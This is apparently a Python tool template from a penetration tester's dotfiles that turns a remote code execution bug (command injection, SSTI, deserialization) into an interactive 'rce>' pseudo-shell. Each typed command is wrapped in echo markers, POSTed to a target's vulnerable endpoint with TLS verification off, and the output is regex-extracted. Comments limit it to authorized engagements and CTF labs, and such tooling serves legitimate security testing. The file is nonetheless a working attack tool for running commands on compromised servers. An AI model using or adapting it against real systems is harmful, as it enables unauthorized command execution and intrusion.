#!/usr/bin/env python3
# pseudo-shell.py — a reusable cmd.Cmd interactive shell over blind/awkward RCE.
#
# The IppSec signature move (see ~/ippsec): when a bug gives you code execution
# but a real reverse shell is painful (SSTI, command injection, deserialization,
# RCE behind an egress firewall), DON'T fight for the reverse shell — wrap the
# primitive in this loop. Every line you type is sent to the target; the response
# is regex'd back and printed. Enumerating through this beats tampering one Burp
# Repeater request at a time.
#
# ── SCOPE ─────────────────────────────────────────────────────────────────────
#   AUTHORIZED engagements (written ROE + defined scope) and your own CTF/HTB labs
#   ONLY. Copy this OUT of the dotfiles repo into the engagement's exploit/ dir
#   before you fill it in — exploit code never lives in this repo.
#
# ── HOW TO ADAPT (you change two things) ──────────────────────────────────────
#   1. send_command()  — how a single command string reaches the target. Swap the
#      request/payload for your injection point (URL, param, header, cookie…).
#   2. CAPTURE_RE      — a regex that brackets YOUR command's output out of the
#      surrounding HTML/JSON. The reliable trick: wrap output in unique markers you
#      control (echo START; <cmd>; echo END) and grab between them.
#
# ── DEPENDENCY: requests ──────────────────────────────────────────────────────
#   Current Kali is PEP 668 ("externally managed"), so `pip install requests` is
#   REFUSED system-wide — the old advice simply does not work any more. Pick one:
#     uv run --with requests pseudo-shell.py http://target      # no install at all
#     sudo apt install python3-requests                         # system package
#     uv venv && uv pip install requests && . .venv/bin/activate
#   `uv` is installed by bootstrap.sh, so the first line works out of the box.
#
# Run it:  python3 pseudo-shell.py http://target:8080
#     or:  uv run --with requests pseudo-shell.py http://target:8080
# Quit:    Ctrl-D, or type `exit`.

import os
import re
import sys
from cmd import Cmd

try:
    import requests
    import urllib3  # ships as a requests dependency — always importable alongside it
except ModuleNotFoundError:
    sys.exit(
        "pseudo-shell: the 'requests' package is missing.\n"
        "  Kali is PEP 668-managed, so `pip install requests` will be refused.\n"
        "  Easiest:  uv run --with requests " + os.path.basename(__file__) + " <url>\n"
        "  Or:       sudo apt install python3-requests"
    )

# ── Target wiring — EDIT THESE ────────────────────────────────────────────────
BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"

# Proxying through Burp gives you full request history to debug against — IppSec's
# habit, and worth having. It is OPT-IN rather than on-by-default: when it defaulted
# to http://127.0.0.1:8080 and Burp was not listening, every single request died with
# a ProxyError whose text says nothing about a proxy, which reads as "the target is
# down" instead of "you forgot to start Burp".
#
#   PSEUDOSHELL_PROXY=1 python3 pseudo-shell.py http://target   # default Burp listener
#   HTTP_PROXY=http://127.0.0.1:8081 python3 pseudo-shell.py …  # explicit, also enables
#
# Burp uses one listener for both schemes, so http and https share it.
_PROXY = os.environ.get("HTTP_PROXY") or os.environ.get("http_proxy") or ""
if not _PROXY and os.environ.get("PSEUDOSHELL_PROXY"):
    _PROXY = "http://127.0.0.1:8080"
PROXIES = {"http": _PROXY, "https": _PROXY} if _PROXY else None
if _PROXY:
    print(f"[*] proxying via {_PROXY} — requests will fail if nothing is listening there")

# Bracket your output so it's trivially grep-able out of the page. If your sink
# already echoes cleanly, set MARKER = "" and point CAPTURE_RE at the real anchor.
MARKER = "ID10T"
CAPTURE_RE = re.compile(rf"{MARKER}(.*?){MARKER}", re.DOTALL)


def send_command(cmd: str) -> str:
    """Send one command to the target and return raw response text.

    EDIT THIS for your injection point. The example below is a generic POST; for
    SSTI you'd embed `cmd` in the template ({{ ... }}), for header injection you'd
    put it in headers=, for a cookie you'd put it in cookies=, etc.
    """
    payload = cmd
    if MARKER:
        # Force unique markers around the output so CAPTURE_RE can isolate it.
        payload = f"echo {MARKER}; {cmd}; echo {MARKER}"
    resp = requests.post(
        f"{BASE_URL}/vulnerable-endpoint",
        data={"input": payload},
        proxies=PROXIES,
        verify=False,
        timeout=15,
    )
    return resp.text


class PseudoShell(Cmd):
    prompt = "rce> "
    intro = f"[+] pseudo-shell against {BASE_URL} — type commands, Ctrl-D to quit"

    def default(self, line: str) -> None:
        try:
            body = send_command(line)
        except requests.RequestException as exc:
            print(f"[!] request failed: {exc}")
            return
        match = CAPTURE_RE.search(body)
        print(match.group(1).strip() if match else "[no output captured — check CAPTURE_RE]")

    # `cd` etc. are stateless here (each request is independent). For a stateful
    # shell — persistent cwd/env, interactive tools — graduate to IppSec's forward
    # shell (see ~/ippsec).
    def do_EOF(self, _line: str) -> bool:
        print()
        return True

    do_exit = do_quit = do_EOF


if __name__ == "__main__":
    # Silence the self-signed-cert warning that fires on every request via Burp.
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    try:
        PseudoShell().cmdloop()
    except KeyboardInterrupt:
        print()
